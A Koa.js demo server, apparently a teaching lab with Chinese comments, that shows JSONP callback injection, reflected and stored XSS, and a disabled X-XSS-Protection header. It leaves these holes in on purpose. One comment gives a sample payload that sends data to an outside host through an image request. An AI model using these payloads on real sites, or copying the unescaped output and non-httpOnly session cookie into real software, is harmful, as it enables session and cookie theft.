const Koa = require("koa");
const app = new Koa();

const csrf = require("./csrf")("233333333333333");

app.use(async (ctx, next) => {
  console.log("url", ctx.url);
  switch (ctx.path) {
    // http://localhost:3000/jsonp.html?callback=console.log(document.cookie);void
    // http://localhost:3000/api/jsonp?callback=(new%20Image).src%3D%22http%3A%2F%2Fkaris.com%3A3000%2Freport%3Fdata%3D%22%2BJSON.stringify
    case "/jsonp.html":
      ctx.type = "html";
      //页面一进来的时候，就设置一个SESSIONID的随机值。并且httpOnly为false。ps：当httpOnly的true的时候，页面是读不到cookie的
      ctx.cookies.set("SESSIONID", Math.random(), { httpOnly: false });
      ctx.body = `<body>
  <script>
    var csrf_token = "${csrf.create()}";
    var callback = (location.search.match(/callback=([\\w\\W]+)/i) || [])[1] 
    var $script = document.createElement('script');
    // $script.src = '/api/jsonp?callback=' + callback;
    $script.src = '/api/jsonp?token=' + csrf_token + '&callback=' + callback;
    document.body.appendChild($script);
  </script>
</body>`;
      break;
    case "/api/jsonp":
      console.log("我 /api/json 被调用了");
      let csrf_close = false;
      if (csrf_close || csrf.verify(ctx.query.token)) {
        ctx.type = "js";
        ctx.body = `${ctx.query.callback}(${Math.random()})`;
      } else {
        ctx.status = 403;
        ctx.body = "token error";
      }
      break;
    // http://localhost:3000/xss.html?href=javascript%3Aalert('反射') //反射型的XSS
    case "/xss.html":
      ctx.type = "html";
      //  let img_src = `https://www.baidu.com/img/bd_logo1.png`;
      let img_src = `https://omg.baidu.com/img.png" onerror="alert('存储型XSS')`; // 存储型的XSS
      ctx.body = require("fs")
        .readFileSync("./xss.html")
        .toString()
        .replace("{{img_src}}", img_src);
      break;
    // http://localhost:3000/search?kw=hello
    // https://juejin.im/post/5912740344d904007b010252
    case "/search":
      ctx.type = "html";
      ctx.set("x-xss-protection", "0");
      // ctx.set('x-xss-protection', '1; mode=block')
      console.log("keyword:", ctx.query.keyword);
      ctx.body = `您搜索的关键词是: '${ctx.query.keyword}'`;
      break;
    default:
      ctx.status = 204;
      ctx.body = "";
  }
});

app.listen(3000);
